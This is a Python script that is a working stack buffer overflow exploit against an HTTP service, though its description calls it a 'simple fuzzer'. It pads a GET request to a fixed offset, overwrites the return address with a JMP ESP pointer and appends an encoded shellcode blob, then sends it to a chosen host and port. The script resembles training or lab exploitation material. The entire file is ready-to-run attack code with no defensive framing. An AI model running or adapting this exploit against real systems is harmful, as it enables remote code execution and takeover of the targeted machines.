#!/usr/bin/python

import argparse
import sys
import socket
import struct

parser = argparse.ArgumentParser("Simple fuzzer for buffer overflow exploits")

parser.add_argument(action='store', dest='rhost', type=str, help='remote host')
parser.add_argument(action='store', type=int, dest='rport', help='remote port')

ap = parser.parse_args()
print("Sending exploit to " + ap.rhost + " " + str(ap.rport))

offset_srp = 1787
ptr_jmp_esp = 0x7e429353
nops = "\x83\xec\x10"
# nops = "\x90" * 18
buf_len = 2250

# badchars = [0x00, 0x0A, 0x0D]
# mona jmp -r esp -cpb "\0x00\0x0A\0x0D"
shell = ""
shell += "\xba\x4a\x27\xb6\x4b\xd9\xc2\xd9\x74\x24\xf4\x5e\x33"
shell += "\xc9\xb1\x31\x31\x56\x13\x03\x56\x13\x83\xee\xb6\xc5"
shell += "\x43\xb7\xae\x88\xac\x48\x2e\xed\x25\xad\x1f\x2d\x51"
shell += "\xa5\x0f\x9d\x11\xeb\xa3\x56\x77\x18\x30\x1a\x50\x2f"
shell += "\xf1\x91\x86\x1e\x02\x89\xfb\x01\x80\xd0\x2f\xe2\xb9"
shell += "\x1a\x22\xe3\xfe\x47\xcf\xb1\x57\x03\x62\x26\xdc\x59"
shell += "\xbf\xcd\xae\x4c\xc7\x32\x66\x6e\xe6\xe4\xfd\x29\x28"
shell += "\x06\xd2\x41\x61\x10\x37\x6f\x3b\xab\x83\x1b\xba\x7d"
shell += "\xda\xe4\x11\x40\xd3\x16\x6b\x84\xd3\xc8\x1e\xfc\x20"
shell += "\x74\x19\x3b\x5b\xa2\xac\xd8\xfb\x21\x16\x05\xfa\xe6"
shell += "\xc1\xce\xf0\x43\x85\x89\x14\x55\x4a\xa2\x20\xde\x6d"
shell += "\x65\xa1\xa4\x49\xa1\xea\x7f\xf3\xf0\x56\xd1\x0c\xe2"
shell += "\x39\x8e\xa8\x68\xd7\xdb\xc0\x32\xbd\x1a\x56\x49\xf3"
shell += "\x1d\x68\x52\xa3\x75\x59\xd9\x2c\x01\x66\x08\x09\xed"
shell += "\x84\x99\x67\x86\x10\x48\xca\xcb\xa2\xa6\x08\xf2\x20"
shell += "\x43\xf0\x01\x38\x26\xf5\x4e\xfe\xda\x87\xdf\x6b\xdd"
shell += "\x34\xdf\xb9\xbe\xdb\x73\x21\x6f\x7e\xf4\xc0\x6f"

buf = ''
buf += '\x41' * offset_srp
buf += struct.pack("<I", ptr_jmp_esp)
buf += nops
buf += shell
buf += '\x43' * (buf_len - len(buf))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((ap.rhost, ap.rport))
    s.send("GET " + buf + " HTTP/1.0\r\n\r\n")
    data = s.recv(1024)
    print("Sent buffer length " + str(len(buf)))
    s.close()
except Exception:
    print("[+] exploit sent")
    sys.exit()
